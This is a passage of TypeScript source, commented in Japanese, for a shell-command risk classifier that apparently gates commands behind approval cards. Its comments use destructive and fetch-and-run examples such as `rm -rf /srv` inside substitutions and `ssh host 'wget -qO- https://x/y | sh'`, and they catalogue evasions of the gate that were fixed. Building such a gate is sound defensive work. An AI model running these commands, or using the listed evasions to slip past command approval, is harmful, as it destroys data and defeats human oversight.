   * コマンド位置の予約語 (`then` / `do` / `!` / `time` …) も前置語として読み飛ばすか (既定 true)。
   *
   * **check-classifier は false を渡す (QA-CQ11-2 ≡ SEC-CQ11-2・R11 監査 H)**: 承認ゲートは
   * 「その先に何が実行されうるか」を見るので予約語を飛ばして実コマンドへ届くのが安全側だが、
   * ADR 0015 の check 認定は「exit code が**そのチェックの結果**か」を主張するので逆になる —
   * `if false; then pytest; fi` は exit 0 で pytest を実行せず、`! pytest` は exit を反転する。
   * 予約語を飛ばすとこれらが check=test/program に認定され、失敗したテストが「passed」バッジになる
   * (fake-green・ADR 0015 が禁じる方向)。認定側は env 代入だけを読み飛ばし、複合文の内側は
   * 認定しない (under-credit = 安全方向)。読み手は 1 つのまま (第二の前置語パーサを作らない)。
   */
  readonly reservedWords?: boolean;
}

export function skipCommandPrefixWords(
  tokens: string[],
  options: CommandPrefixOptions = {},
): number {
  const reservedWords = options.reservedWords ?? true;
  let i = 0;
  while (i < tokens.length) {
    const t = tokens[i];
    if (t === undefined) break;
    if (reservedWords && t === "case") {
      // `case WORD in PATTERN) cmd` — WORD・`in`・最初の `PATTERN)` まではコマンドではない。
      //   `PATTERN)` が無い (パターンが `|` で別セグメントへ割れた) ときは末尾まで消費する =
      //   このセグメントにコマンドは無い。後続の `b) rm …` は先頭が clean 名でないので
      //   unanalyzable の床 (medium + high-risk-other) が受ける。
      i += 1;
      if (i < tokens.length) i += 1; // WORD
      if (tokens[i] === "in") i += 1;
      while (i < tokens.length && !(tokens[i] as string).endsWith(")")) i += 1;
      if (i < tokens.length) i += 1; // `PATTERN)`
      continue;
    }
    if (reservedWords && t === "time") {
      // `time [-p] [--] pipeline` — timespec 語はコマンドではない (R16 H・SEC-CQ16-1)。option 形の語は
      //   すべて読み飛ばす (R17 M・SEC-CQ17-2: dash は `time -v rm …` を外部 time で実行する)。
      i += 1;
      while (i < tokens.length && isTimespecWord(tokens[i] as string)) i += 1;
      continue;
    }
    if (ASSIGNMENT_TOKEN_RE.test(t) || (reservedWords && COMMAND_POSITION_RESERVED_WORDS.has(t))) {
      i++;
      continue;
    }
    break;
  }
  return i;
}

/**
 * セグメントの raw トークン列から「実際に起動されるプログラム」のトークン列を導出する **正準の
 * 導出鎖** (TDA-CQ11-4・R11 監査 M): 前置語 (env 代入 + コマンド位置の予約語) を読み飛ばし →
 * runner ラッパを剥がす。以前は同じ鎖が `segmentProgramName` / 分類本体 / egress 判定 /
 * check-classifier に**別々に手組み**されており、R9 の H (`launchesShellWithProcessSubstitution`
 * だけが 1 段を飛ばした) はまさにこの class だった。段の集合を 1 箇所に閉じ、消費者は皆ここを通す。
 * `capExhausted` はラッパ多重で実コマンドを隠した疑い (分類本体だけが床に使う)。
 * 正準チェーンを通さない箇所は 3 つあり、いずれも意図的である (TDA-CQ12-5):
 *  - `isPersistDeniedCommand` — 永続 allowlist は前置語やラッパが**ある時点で** deny する構造ゲートで、
 *    実プログラムへ「届く」ことが目的ではない。
 *  - `unanalyzableSegmentRisk` — **段 1 (前置語 skip) のみ**。「このセグメントを構造解析できるか」の
 *    判定であり、ラッパ名自体がクリーンな実行可能名なのでラッパ剥がしは答えを変えない。加えて
 *    `rawTokens.slice(startIdx)` に**索引**が必要で、トークン列を返す本関数では表せない。
 *  - `check-classifier.ts` の exec-runner 貫通後 — **段 2 (ラッパ剥がし) のみ**。`unwrapExecRunner` が
 *    返すのは shell の語ではなく **argv** で、先頭の `FOO=bar` は runner へのリテラル引数 (shell 代入
 *    ではない) ゆえ段 1 を当ててはならない。
 */
export function programTokens(
  rawTokens: string[],
  options: CommandPrefixOptions = {},
): StrippedProgram {
  return stripRunnerWrappers(rawTokens.slice(skipCommandPrefixWords(rawTokens, options)));
}

/**
 * コマンド語 (プログラム位置の語) が置換 (`$(…)` / backtick) を含むか (SEC-CQ11-1・R11 監査 M)。
 * `readWord` は置換スパンを 1 語に積むので、`` `echo rm` -rf /srv `` のプログラム名は静的に決まらない。
 */
function hasCommandWordSubstitution(word: string | undefined): boolean {
  return word !== undefined && (word.includes("$(") || word.includes("`"));
}

/**
 * セグメント内の command 置換を**平坦化**する (`$(inner)` / `` `inner` `` → ` inner `)。
 *
 * **SEC-CQ11-1 (R11 監査 M)**: 旧 `tokenize` は引用/置換文字を空白に潰す近似だったため
 * `` `echo rm` -rf /srv `` を `echo rm -rf /srv` と読み、偶然 `recursive-rm` を拾っていた。語を正しく
 * 読む v0.8 では置換が 1 語になり named category が落ちる (DEFAULT_GATED は inline-code で保持するが
 * `demo` preset では de-gate = base 比回帰・egress も 53 形で片側喪失)。置換の結果がプログラム名になる
 * 形は静的に決められないので、旧近似と同じ over-approximation を**加算のみ**で再現する: 平坦化した
 * テキストの分類結果は verdict/category を上げることしかできない。置換の切り出しは正準収集器
 * (`collectSubstitutionInners`) を共有し、第二の検出器を作らない。
 */
function flattenCommandSubstitutions(segment: string): string {
  const { inners, starts, aborted } = collectSubstitutionInners(segment, "command");
  if (aborted || starts.length === 0) return segment;
  let out = "";
  let cursor = 0;
  for (let k = 0; k < starts.length; k += 1) {
    const start = starts[k] as number;
    const inner = inners[k] as string;
    const opener = segment[start] === "`" ? 1 : 2;
    out += `${segment.slice(cursor, start)} ${inner} `;
    cursor = start + opener + inner.length + 1;
  }
  return out + segment.slice(cursor);
}

/**
 * 解析不能セグメント (先頭がシェルメタ文字) の risk を判定する (D)。
 * grouping メタ文字を剥がした内側を再分類して high を拾い、不能なら medium 床上げ。
 * 該当しない (先頭がクリーンな実行可能名 / 代入のみ) なら undefined を返す。
 *
 * `fromProcSubSplit`: このセグメントが `<(`/`>(` の split 断片 (`(ls)` 等) で、かつコマンドの
 * 起動が process-sub を**実行しない**ベニーン (diff/cat 等) のときに medium 床上げを抑止する。
 * `diff <(ls) <(ls)` を low 維持するため (over-gate 防止)。内側が high なら依然 high を返す。
 */
function unanalyzableSegmentRisk(
  rawTokens: string[],
  rawSegment: string,
  depth: number,
  suppressMediumFloor: boolean,
  categories: Set<PolicyCategory> | undefined,
  split: SegmentSplitter,
): "high" | "medium" | undefined {
  // **backstop の局所化 (SEC-CQ9-4・R9 監査 M)**: 末尾の `high-risk-other` は「コマンド全体の
  //   category が空」で条件付けられていたため、先行セグメントが category を 1 つ付けるだけで
  //   消えた (`chown -R nobody /a ; $X -rf /tmp/x` は `$X` 単独なら medium[high-risk-other] で
  //   bypass DEFAULT がゲートするのに、前置があると空になり defer = 実行になる)。
  //   backstop の意味は「**このセグメントを**解析できなかった」であり、他セグメントの成果とは無関係。
  const categoriesAtEntry = categories?.size ?? 0;
  const startIdx = skipCommandPrefixWords(rawTokens);
  const first = rawTokens[startIdx];
  if (first === undefined) return undefined; // 代入のみ (`FOO=bar`) → コマンド無し。委ねる。
  // **escape で綴りを変えた実行形は canonical 名に畳めても床を保つ (v0.8 統合)**: `\curl` は
  //   alias/function を迂回する意図的な回避形で、base から medium 床を保っている。床の根拠を
  //   「旧 tokenize が backslash を落とさない」という副作用でなく明示判定に置く。範囲は base と
  //   同じ **非クォートの escape のみ**に保つ (引用形 `r""m` まで広げるのは適用範囲の変更ゆえ別判断)。
  const escapedProgram = hasEscapedProgramWord(rawSegment);
  if (isCleanExecutableToken(first) && !escapedProgram) return undefined; // 通常コマンド名。
  // POSIX shell の backslash escape を畳めば通常 basename になる形 (`r\m`, `\/bin\/rm`) は
  // commandName と各構造述語で危険名を解析できる。ただし非 canonical な実行形自体は従来どおり
  // medium 床を保つ (`\curl` 等の persistable=false を弱めない)。named category は後続述語に委ね、
  // high-risk-other を重複付与しない。
  // **空白を含むプログラム語は canonical basename に畳まない (v0.8 統合)**: 正しく語を読むと
  //   `'rm -rf /srv'` が 1 トークンになり、`commandName` の `/` 分割が `srv` という**でっち上げの
  //   basename** を作って「きれいな実行可能名」に見せてしまう。bash はこの綴りのコマンドを
  //   探して見つけられない (何も実行されない) が、判定不能であることに変わりはないので
  //   named category を伴う床へ倒す (bypass が空 category で defer するのを防ぐ)。
  const normalizedName = /\s/.test(first) ? "" : commandName(rawTokens.slice(startIdx));
  if (isCleanExecutableToken(normalizedName)) return "medium";

  // grouping/quote メタ文字を剥がして内側を露出させ、再分類で high を拾う。
  if (depth < MAX_INLINE_DEPTH) {
    const unwrapped = stripGroupingWrappers(rawSegment);
    // 剥がしで実際に変化したときのみ再分類 (無限ループ防止)。
    if (unwrapped.length > 0 && unwrapped !== rawSegment) {
      const inner = classifyCommandRiskInternal(unwrapped, depth + 1, categories, split);
      if (inner === "high") return "high";
    }
  }
  // process-sub の split 断片かつ起動がベニーン (実行しない) なら medium 床上げを抑止 (low 維持)。
  if (suppressMediumFloor) return undefined;
  // 先頭メタ文字を持つ = 構造判定不能。YOLO/default policy でも分類不能な実行形を
  // silent defer しないよう high-risk-other backstop を付け、risk は従来どおり medium に保つ。
  if (categories !== undefined && categories.size === categoriesAtEntry)
    categories.add("high-risk-other");
  return "medium";
}

/**
 * インラインコード/置換の risk を判定する (SEC-1)。
 *
 * tokens は quote-strip 済みトークン列、rawSegment は同セグメントの生文字列 (置換検出用)。
 * 戻り値: "high" (内側が確実に破壊的) / "medium" (ゲート対象・床上げ) / undefined (該当せず)。
 *
 * depth: 再帰深さ。内側コードを classifyCommandRisk で再分類する際、無限再帰を防ぐ上限を設ける。
 *
 * **1 ネストあたりの消費は 1 (QA-CQ6-3・R6 監査 H の副次修正)**: 以前は呼び出し側が
 * `reclassify*(command, depth + 1, …)` とし、その内部でも inner を `depth + 1` で分類していたため
 * **1 段につき 2 消費**していた。結果 2 段ネスト (`cat <(cat <(find /tmp -delete))`) で上限に達し、
 * `classifyCommandRiskInternal` の上限枝が **category を付けずに** medium を返して bypass ゲートを
 * 落としていた (通常モードは呼び出し側が risk を捨てるため low のまま = 二重に無防備)。
 * 呼び出し側を `depth` 据え置きにして計上を 1 本化した。終了性は
 * 「`classifyCommandRiskInternal` へ再入するときだけ +1」で保たれる。
 */
const MAX_INLINE_DEPTH = 4;
function inlineCodeRisk(
  tokens: string[],
  rawSegment: string,
  depth: number,
  categories: Set<PolicyCategory> | undefined,
  split: SegmentSplitter,
): "high" | "medium" | undefined {
  const name = commandName(tokens);

  // eval "..." → 内側は任意コマンド。再パースは困難なので medium 以上 (over-gate)。
  if (name === "eval") {
    categories?.add("inline-code");
    return "medium";
  }

  // 遠隔/コンテナ実行の引用オペランドを内側コードとして再分類する (TDA-CQ9-4・R9 監査 M)。
  //   **内側が non-low のときだけ**ゲートする — `ssh host 'ls -la'` のような日常操作で
  //   承認カードを出さないため (over-gate は本ブランチが潰そうとしている症状そのもの)。
  //   **この分岐は加算であって置換ではない (SEC-CQ10-1 ≡ TDA-CQ10-1 ≡ QA-CQ10-1・R10 監査 H・
  //   3 レーン一致)**: R9 は分岐末尾に無条件の `return undefined` を置いたため、後続の
  //   `isInlineShell` / `hasLiveCommandSubstitution` が**構造的に到達不能**になり、
  //   `ssh host $(rm -rf /srv)` (base は high[recursive-rm]) が low/[] へ落ちた — 9 runner 全部・
  //   `$()`/backtick の両方で。引用オペランドが危険なら**それを**返し、そうでなければ以降の
  //   ゲートへ流す (早期 return しない)。
  //   **全引用スパンを見る (SEC/TDA/QA 3 レーン一致の M)**: `lastQuotedOperand` は最後のスパンだけ
  //   を返したため `ssh host 'rm -rf /' 'note'` で外れた。各スパンを再分類し最大 risk を採る。
  if (REMOTE_EXEC_RUNNERS.has(name) && depth < MAX_INLINE_DEPTH) {
    let remoteRisk: "high" | "medium" | undefined;
    for (const remote of quotedOperands(rawSegment)) {
      if (remote.trim().length === 0) continue;
      const innerRisk = classifyCommandRiskInternal(remote, depth + 1, categories, split);
      if (innerRisk === "high") {
        remoteRisk = "high";
        break;
      }
      if (innerRisk === "medium") remoteRisk = "medium";
    }
    if (remoteRisk !== undefined) {
      categories?.add("inline-code");
      return remoteRisk;
    }
    // fall through: 引用オペランドが無害でも、同じ segment の置換 (`$(…)` / backtick) や
    // inline-shell 形は下のゲートが見る。
  }

  // シェルのインラインコード (sh -c "..." 等)。SEC-1 #5: python3.11 等のバージョン付きでも拾う。
  if (isInlineShell(name)) {
    const flagIdx = tokens.findIndex((t, i) => i > 0 && SHELL_INLINE_FLAG_RE.test(t));
    if (flagIdx >= 0) {
      categories?.add("inline-code");
      // クォートは tokenize で剥がれているため、フラグ以降のトークンが内側コードの語列。
      const inner = tokens.slice(flagIdx + 1);
      if (inner.length > 0 && depth < MAX_INLINE_DEPTH) {
        // 内側を再帰再分類: high を拾えれば high、そうでなければ fail-safe で medium に床上げ。
        const innerRisk = classifyCommandRiskInternal(
          inner.join(" "),
          depth + 1,
          categories,
          split,
        );
        return innerRisk === "high" ? "high" : "medium";
      }
      // 内側が抽出できない (クォート/エスケープで再パース不能) → fail-safe medium。
      return "medium";
    }
    // インラインフラグが無い場合: ファイル実行 (`sh script.sh`) なら low、stdin からコードを
    // 読む形 (`echo ... | sh` / 引数なし `sh`) なら中身を再分類できない → fail-safe medium (#1-3)。
    if (!hasScriptFileOperand(tokens)) {
      categories?.add("inline-code"); // stdin/対話シェル = 動的コード実行。
      return "medium"; // 非フラグ operand 無し = stdin/対話 → gated。
    }
    // -c 等のインラインフラグが無い `sh script.sh` はファイル実行 → ゲート対象外 (over-gate 防止)。
  }

  // インタプリタのインラインコード (python -c / node -e 等)。言語別の安全な再パースは困難 →
  // インラインフラグがあれば一律 medium 以上 (fail-safe; over-gate を許容)。SEC-1 #5: バージョン付き対応。
  if (isInlineInterpreter(name)) {
    const hasInlineFlag = tokens.slice(1).some((t) => INTERPRETER_INLINE_FLAGS.has(t));
    if (hasInlineFlag) {
      categories?.add("inline-code");
      return "medium";
    }
    // pipe-to-interpreter (`cat foo | python` 引数なし = stdin からコードを読む) → fail-safe medium。
    if (!hasScriptFileOperand(tokens)) {
      categories?.add("inline-code");
      return "medium";
    }
    // `node app.js` / `python manage.py runserver` のようなファイル実行は low のまま。
  }

  // コマンド置換 `$(...)` / backtick。可能なら内側を再帰再分類して high を拾う。
  if (hasLiveCommandSubstitution(rawSegment)) {
    categories?.add("inline-code");
    if (depth < MAX_INLINE_DEPTH) {
      const innerRisk = reclassifySubstitution(rawSegment, depth, categories, split);
      if (innerRisk === "high") return "high";
    }
    return "medium"; // 置換あり = 中身が再分類で確定しなくてもゲート対象。
  }

  return undefined;
}

/**
 * `$(...)` / backtick の中身を抽出して再分類する (有界・正規表現の再パース無し)。
 *
 * **抽出は正準 `substitutionEnd` を共有する (TDA-CQ7-3・R7 監査 M)**: R6 は
 * `reclassifyProcessSubstitution` だけを移行し、こちらは `indexOf(")")` の素朴版のままだった。
 * 結果 (a) 「単一抽出器へ統合した / 第二の並置検出器を作らない」という docstring の主張が
 * 事実でなくなり、(b) 入れ子 `$()` で最初の閉じ括弧に切れて内側の named category を落としていた
 * (`echo $(echo $(rm -rf /srv))` が `medium[inline-code]` = recursive-rm 喪失)。
 * 打ち切り (未終端) は `reclassifyProcessSubstitution` と同じく兄弟を巻き込まず、
 * 「読めなかった」ことを category の床で表明する。
 */
function reclassifySubstitution(
  rawSegment: string,
  depth: number,
  categories: Set<PolicyCategory> | undefined,
  split: SegmentSplitter,
): "high" | "medium" | undefined {
  // `$(...)` と backtick を**引用状態つきの単一収集器**で拾う (SEC-CQ8-3・R8 監査)。
  //   旧実装は `$(` を引用非対応で走査し、backtick は `split("`")` という**第三の並置検出器**
  //   だった。前者は `echo '$(' ` を未終端の置換と誤認して R7 の床で偽陽性を出し、
  //   後者は引用内の backtick を中身として切り出していた。
  const {
    inners,
    aborted,
    capExhausted: scanCapExhausted,
  } = collectSubstitutionInners(rawSegment, "command");
  // ADR 019f0c3e: high で early-return せず全 inner を走査して category を漏れなく集約する
  // (戻り値は従来「high が1つでもあれば high」と同値)。
  let risk: "high" | "medium" | undefined;
  for (const inner of inners) {
    const r = classifyCommandRiskInternal(inner, depth + 1, categories, split);
    if (r === "high") risk = "high";
    else if (r === "medium" && risk !== "high") risk = "medium";
  }
  // 読めなかった置換は「無害」と区別する (SEC-R7-1 と同一契約)。
  if (aborted) {
    categories?.add("high-risk-other");
    if (risk === undefined) risk = "medium";
  }
  // **上限到達は high へ倒す (TDA-CQ9-5 ≡ SEC-CQ9-3・R9 監査 M)**: 打ち切ると、その後ろに
  //   ある**読める**破壊的置換の named category が落ちる (未終端の `$(` を 8 個前置するだけで
  //   内側の history-rewrite が消え、その category だけを有効にした operator は bypass ゲートを
  //   失う)。「最初の失敗で床は立っている」は risk の話で category には効かない。未終端の置換を
  //   8 個並べる入力は DoS 形であり、正直な fail-safe は high。
  if (scanCapExhausted) risk = "high";
  return risk;
}

/**
 * プロセス置換 `<(...)` / `>(...)` の中身を抽出して再分類する (SEC-1 #4)。
 * `$(...)` 抽出と同型の素朴な文字走査 (有界・正規表現の再パース無し)。`bash <(echo "rm -rf /")`
 * の `<(...)` 内コマンドを拾い、破壊的なら high を返す。over-extraction は安全側に倒すため許容。
 */
function reclassifyProcessSubstitution(
  command: string,
  depth: number,
  categories: Set<PolicyCategory> | undefined,
  split: SegmentSplitter,
): "high" | "medium" | undefined {
  // **入れ子対応の抽出 (QA-CQ6-3・R6 監査 H)**: 旧実装は `indexOf(")")` で最初の閉じ括弧まで
  //   しか取らず、`cat <(cat <(find /tmp -delete))` の内側 (実際に実行される) を取りこぼして
  //   category を落としていた。括弧の深さを数える正準 `substitutionEnd` を共有する
  //   (第二の並置検出器を作らない・security-gate-reuse-canonical-parser)。
  //   R8 監査 SEC-CQ8-3: 検出点が引用を見ていなかったため `grep -rn '<(' .` のような
  //   **引用内リテラル**を未終端の置換と誤認し、R7 の床で偽の承認カードを出していた。
  //   引用状態つきの正準収集器へ統合する。
  const {
    inners,
    aborted,
    capExhausted: scanCapExhausted,
  } = collectSubstitutionInners(command, "process");
  // ADR 019f0c3e: high で early-return せず全 inner を走査して category を漏れなく集約する。
  let risk: "high" | "medium" | undefined;
  for (const inner of inners) {
    const r = classifyCommandRiskInternal(inner, depth + 1, categories, split);
    if (r === "high") risk = "high";
    else if (r === "medium" && risk !== "high") risk = "medium";
  }
  // **抽出できなかった置換があれば「low」と区別する (SEC-R7-1)**: 戻り値 undefined は
  //   「全 inner が無害」と「そもそも読めなかった」の両方を意味していたため、呼び出し側が
  //   前者と誤解して素通りさせていた。読めなかった場合は分類不能として gated に倒す。
  if (aborted) {
    categories?.add("high-risk-other");
    if (risk === undefined) risk = "medium";
  }
  // **上限到達は high へ倒す (TDA-CQ9-5 ≡ SEC-CQ9-3・R9 監査 M)**: 打ち切ると、その後ろに
  //   ある**読める**破壊的置換の named category が落ちる (未終端の `$(` を 8 個前置するだけで
  //   内側の history-rewrite が消え、その category だけを有効にした operator は bypass ゲートを
  //   失う)。「最初の失敗で床は立っている」は risk の話で category には効かない。未終端の置換を
  //   8 個並べる入力は DoS 形であり、正直な fail-safe は high。
  if (scanCapExhausted) risk = "high";
  return risk;
}

/**
 * 後続のファイル/プロセス置換を「実行/source 評価する」起動コマンド (SEC-1 #4 / round2 F)。
 * shell/インタプリタに加え、source 系ビルトイン `.` / `source` / `eval` を含める。
 * `. <(echo "rm -rf /")` / `source <(...)` は中身を source 実行するためゲート対象。
 * ⚠️ `diff <(ls)` / `cat <(...)` / `tee` のように中身を**ファイルとして読むだけで実行しない**
 *    コマンドは含めない (over-gate 防止。BENIGN は low 維持)。
 */
const PROC_SUBST_EXECUTING_BUILTINS = new Set([".", "source", "eval"]);
function isProcessSubstitutionExecutor(name: string): boolean {
  return (
    isInlineShell(name) || isInlineInterpreter(name) || PROC_SUBST_EXECUTING_BUILTINS.has(name)
  );
}

/**
 * コマンドが「実行系起動コマンド + プロセス置換」か (SEC-1 #4 / round2 F)。
 * 起動コマンド (先頭セグメントの runner ラッパ剥がし後) が実行/source 系で、かつ
 * 文字列に `<(`/`>(` を含むとき true。プロセス置換の中身は再パースしづらいためゲート対象。
 */
/**
 * セグメントから「実際に起動されるプログラム名」を導出する **正準ヘルパ** (T1 単一出所)。
 *
 * 順序は `先頭 env 代入を飛ばす → runner ラッパを剥がす → basename 小文字化`。この 3 段は
 * どのゲートでも同じでなければならない。
 *
 * **SEC-CQ9-2 ≡ TDA-CQ9-1 (R9 監査 H)**: 5 つある commandName ゲートのうち
 * `launchesShellWithProcessSubstitution` だけが `skipCommandPrefixWords` (現 `skipCommandPrefixWords`) を通しておらず、
 * `commandName(["FOO=1","bash",…])` が `"foo=1"` を返すため `FOO=1 bash <(echo rm -rf /srv)` で
 * 通常モードも全 bypass preset もゲートが外れた (base は medium[inline-code] でゲートしていた
 * = 明確な回帰・実 bash は rm を実行する)。R8 が閉じたのは「位置」の軸で、「正規化」の軸が
 * 残っていた。以後どのゲートも 1 段を飛ばせないよう導出を 1 関数に閉じる。
 */
function segmentProgramName(segment: string): string {
  return commandName(programTokens(tokenize(segment)).tokens);
}

/**
 * 起動判定の束縛に許す総走査量 (文字数)。束縛はサイトごとに `command.slice(0, start)` を正準
 * splitter で読み直すので、コストは Σ start (サイト数 × 位置) で決まる。
 *
 * **サイト数ではなく総量で有界化する (R10 M・R8 の偽陽性への縮退)**: 以前は「サイト 8 個超」で
 * 全セグメント走査へ縮退していたが、それは R8 の偽陽性 (`node build.js && paste <(a) … <(i)` が
 * medium[inline-code]) を**サイト数だけで**呼び戻す形だった — 短いコマンドに置換が 9 個並ぶのは
 * `paste` / `diff` の日常形で、実 bash はどれも実行しない。総量の上限は「解析可能コマンド長
 * 8 本分」= 長さ上限いっぱいのコマンドで末尾近くにサイトが 8 個あってもなお束縛が効く量で、
 * 縮退するのは長大かつ多数の置換を持つ病的入力だけになる (それでも縮退先は over-gate = 安全側)。
 * 上限系の定数は `MAX_ANALYZABLE_COMMAND_LEN` から導出する (SEC-R7-1 の規律)。
 */
const MAX_EXECUTOR_BINDING_WORK = 8 * MAX_ANALYZABLE_COMMAND_LEN;

function launchesShellWithProcessSubstitution(command: string, split: SegmentSplitter): boolean {
  if (!hasProcessSubstitution(command)) return false;
  // **全セグメントを走査する (SEC-CQ8-1・R8 監査 H)**: 以前は `split(command)[0]` だけを見ており、
  //   先行セグメントが 1 つ付くだけでゲートが外れた — `ls; bash <(echo rm -rf /srv)` は
  //   base で medium[inline-code] だったのに low[] へ落ちていた (実 bash は rm を実行する)。
  //   693e782 で `<(` を redirect として lex するようになって以降、起動コマンドは
  //   `bash script.sh` 形に見えるため、この位置判定が唯一の砦になっていた。
  //   セキュリティゲートが「1 箇所しか見ない」形は同クラスの穴を繰り返し生むため、位置不変にする。
  // **判定を「その置換を含む単純コマンド」へ束縛する (SEC-CQ9-5 / TDA-CQ9-3・R9 監査 M)**:
  //   R8 は位置依存を消すために全セグメントを走査したが、条件が「コマンド全体のどこかに
  //   `<(` の**字面**があり、かつどこかのセグメントが shell/インタプリタ」になったため、
  //   `diff <(sort a) <(sort b) && node scripts/check.js` が medium[inline-code] になった
  //   (= 本ブランチが除去しようとしている偽陽性クラスの再導入)。置換の開始位置までを
  //   **正準 splitter** で切り、その最後のセグメント = bash 的な「その置換を持つ単純コマンド」
  //   のプログラム名だけを見る。位置不変性 (R8 の SEC-CQ8-1) はそのまま保たれる。
  const { starts, aborted } = collectSubstitutionInners(command, "process");
  const bindingWork = starts.reduce((sum, start) => sum + start, 0);
  if (!aborted && bindingWork <= MAX_EXECUTOR_BINDING_WORK) {
    for (const start of starts) {
      const before = split(command.slice(0, start));
      const owner = before[before.length - 1];
      if (owner !== undefined && isProcessSubstitutionExecutor(segmentProgramName(owner)))
        return true;
    }
    return false;
  }
  // 読めなかった / 総走査量が上限超過 → 束縛できないので従来の全セグメント走査 (安全側)。
  for (const seg of split(command)) {
    if (isProcessSubstitutionExecutor(segmentProgramName(seg))) return true;
  }
  return false;
}

/**
 * セグメント内の**全引用スパンの中身**を出現順に返す (未終端に当たったらそこまで)。
 * `ssh host 'cmd'` / `docker exec c sh -c 'cmd'` のように、引用済みオペランドを別のシェルへ
 * 丸ごと渡す形の内側コードを取り出すための正準ヘルパ (引用の読み方は `quoteSpanEnd` 単一出所)。
 * 最後のスパンだけを返していた R9 版は `ssh host 'rm -rf /' 'note'` で外れた (R10 M・3 レーン一致)。
 */
function quotedOperands(segment: string): string[] {
  const found: string[] = [];
  let i = 0;
  while (i < segment.length) {
    const span = quoteSpanEnd(segment, i);
    if (span === -1) return found; // 未終端 → ここまでに読めた分だけ (fail-safe は呼び出し側の床)。
    if (span > 0) {
      found.push(segment.slice(i + (segment[i] === "$" ? 2 : 1), span - 1));
      i = span;
      continue;
    }
    if (segment[i] === "\\" && i + 1 < segment.length) {
      i += 2;
      continue;
    }
    i += 1;
  }
  return found;
}

/**
 * 引用済みオペランドを**別のホスト/コンテナのシェル**へ渡す実行系 (TDA-CQ9-4・R9 監査 M)。
 *
 * `ssh host 'wget -qO- https://x/y | sh'` は base では quote 非対応 splitter が引用内の `|` で
 * 千切っていた**副作用**として medium[inline-code] になっていた。quote-aware 化でその偶然が
 * 消え、遠隔/コンテナ内の pipe-to-shell (供給網 RCE の形) が両モードで無カードになった。
 * 字面の denylist (`curl … | sh`) を広げるのではなく、オペランドを**内側コードとして再分類**する。
 */
const REMOTE_EXEC_RUNNERS = new Set([
  "ssh",
  "docker",
  "podman",
  "nerdctl",
  "kubectl",
  "oc",
  "lxc",
  "nsenter",
  "vagrant",
]);

/**
 * 字面 high リテラル → PolicyCategory の **単一テーブル** (TDA-1)。
 *
 * 従来は risk 判定 (HIGH_RISK_LITERAL_RE) と category 付与 (addCommandLevelCategories) が**並置正規表現**で、
 * 片方だけ更新すると drift する潜在ハザードがあった (high⟹≥1 backstop が high-risk-other で誤分類を覆い隠す)。
 * 本テーブルを risk・category の **唯一の出所**にして、両者を機械的に同一ソースから導出する
 * (consolidation-invariant-sweep / security-gate-reuse-canonical-parser の教訓)。
 *
 * - `high: true` … risk を high に押し上げ (旧 HIGH_RISK_LITERAL_RE 相当) かつ category を付与。
 * - `high: false` … **category-only** (gate を catastrophic へ届かせるが risk は不変)。現行テーブルに
 *   category-only エントリは無い (フラグは将来の opt-in 系 category 用に残す)。
 *
 * **DROP DATABASE / dropdb は high (task 01a03b76・R7 QA-CQ7-5 / R11 TDA-CQ11-7 の逆転修正)**:
 *   以前は `drop database` を category-only にしていたが、通常モードの承認ゲート
 *   (`requiresDestructiveApproval` = `risk !== "low"`) は category を見ないため、bypass/YOLO では
 *   db-drop ゲートで止まるのに**通常モードではカードが出ない**という逆転が生じていた
 *   (`DROP TABLE` / `TRUNCATE` は high でカード化・最も不可逆な `DROP DATABASE` だけが素通り)。
 *   risk verdict を category に整合させ、PostgreSQL の CLI 形 `dropdb` も同 class として持つ。
 *   検索引数 (`grep 'DROP DATABASE' …`) が high になる FP は `DROP TABLE` と同じ既知の safe-direction
 *   over-gate (ベンチ doc の calibration table に開示)。
 *
 * **他エンジン / 他粒度の drop 形 (task 01a0440b・TDA-DB-6・PR #44 の pre-existing M)**:
 *   db-drop は PostgreSQL 偏在で、`mysqladmin drop` / mongosh `db.dropDatabase()` / `DROP SCHEMA` /
 *   `DROP OWNED BY` / redis `FLUSHALL`・`FLUSHDB` は risk=low・category 空 (両モードでカード無し) だった。
 *   同 class として**追加のみ**で足す。`drop_?database\s*\(` は mongosh の JS 形と pymongo / sqlalchemy-utils の
 *   snake_case 形を 1 本で持つ (`echo drop_database` のような括弧無しは踏まない)。`mysqladmin` は **二重スコープ**
 *   (下の `segmentRe` 節・task 01a0480f-d29a): 正準 segment 単位の `[\s\S]{0,512}` が主判定で、
 *   whole-command の `[^|;&\n]{0,512}` は base 逐語の非弱化 backstop として残す。
 *   bare-token の `flushall` / `flushdb` は `dropdb` と同じ FP class (`grep -rn flushall src/` が high) —
 *   ベンチ corpus に良性担体を置いて測る。Mongo の `db.collection.drop()` は `.drop(` が pandas 等と衝突する
 *   ため**意図的に非対象** (docs/approval-policy.md の注記に開示)。
 *
 * ReDoS 安全の基準は**入力長に対する線形スケーリング**であって量化子の本数ではない (SEC-DB2-1):
 *   `\b<program>\b[^…]*\b<word>\b` は開始位置 O(n) × 走査 O(n) で O(n²) になる (実測 exponent 2.00・
 *   16 KiB で 63 ms)。`{0,512}` で束縛して線形化 (判定は gap ≤ 512 で同値・境界 512/513 と現実的な長 option
 *   列 gap 319 を INV-DB-DROP-RISK-VERDICT が pin。**TDA-MA-2 の訂正**: 公開 corpus の最大 gap は task
 *   01a0480f-d29a で長 option 列の陽性を入れた結果 **319** になり (旧記述の 20 は失効)、束縛値の歯は
 *   unit test **5 行** — 現実形 1 + whole-command の 512/513 + segment スコープの 512/513・SEC-DB2R3-4)。
 *   全ルールの線形性は INV-LITERAL-RULES-LINEAR (inv-policy-categories) が **regex source
 *   由来の敵対 seed + sample 先頭語 seed + sample 由来 prefix seed + 後尾由来 prefix seed + 各 metachar 以降の全 suffix 由来
 *   prefix seed** で best-of-N 回帰固定する (両側 ratio 判定)。**網羅の範囲
 *   (SEC-DB2R3-1 / QA-DB2R3-1 / task 01a0484c-ecbd)**:
 *   source 由来 seed は先頭 literal が**平坦に綴られた**ルール (現行 17 スキャン regex 中 15 本・#2 fork-bomb は literal run 空、
 *   #12 flush は alternation で断片化・どちらも gap 無し。index は SCAN_TARGETS 基準・QA-MA-4) に届く。alternation / 任意記号を跨ぐ綴り
 *   (`(?:mysql|mariadb)admin` / `mysql_?admin`) では source seed が断片化するため、sample 先頭語を**追加軸**として
 *   常に併用する (軸は追加のみ・R2 で置換していたのを是正・2 乗形 S1/S3・R3 Y4 が RED へ反転する実測)。第 3 軸の
 *   sample 由来「マッチしなくなる最長 prefix」(task 01a0484c-ecbd) は規則の綴りに依存せず、(1)(2) の残余 =
